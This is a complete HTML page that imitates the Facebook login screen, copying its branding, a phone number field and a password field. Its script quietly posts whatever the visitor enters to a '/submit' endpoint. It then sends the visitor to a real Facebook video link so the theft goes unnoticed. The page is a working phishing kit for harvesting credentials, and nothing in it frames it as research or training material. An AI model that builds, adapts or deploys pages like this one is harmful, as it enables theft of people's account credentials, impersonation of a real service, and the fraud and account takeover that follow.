<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook Login</title>
  
  
<script>
  function handleLogin(event) {
    event.preventDefault(); // Prevent default form submission

    const form = document.getElementById("fb-login-form");
    const formData = new FormData(form);

    // Submit form data to backend
    fetch('/submit', {
      method: 'POST',
      body: formData
    }).finally(() => {
      // Redirect after submission
      window.location.href = "https://www.facebook.com/61552005717712/videos/1054940696492650/?mibextid=rS40aB7S9Ucbxw6v";
    });
  }
</script>
  
  
    <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 20px 25px;
      border-radius: 8px;
      width: 350px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      text-align: center;
    }
    .login-box h2 {
      color: #1877f2;
      font-size: 28px;
      margin-bottom: 20px;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
    }
    .login-box button {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }
    .login-box .link {
      margin-top: 10px;
      color: #1877f2;
      display: block;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>facebook</h2>
    <form id="fb-login-form" onsubmit="handleLogin(event)">
      <input type="tel" name="phone" placeholder="Phone Number" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
      <a href="#" class="link">Forgotten password?</a>
      <hr>
      <a href="#" class="link">Create New Account</a>
    </form>
  </div>
</body>
</html>
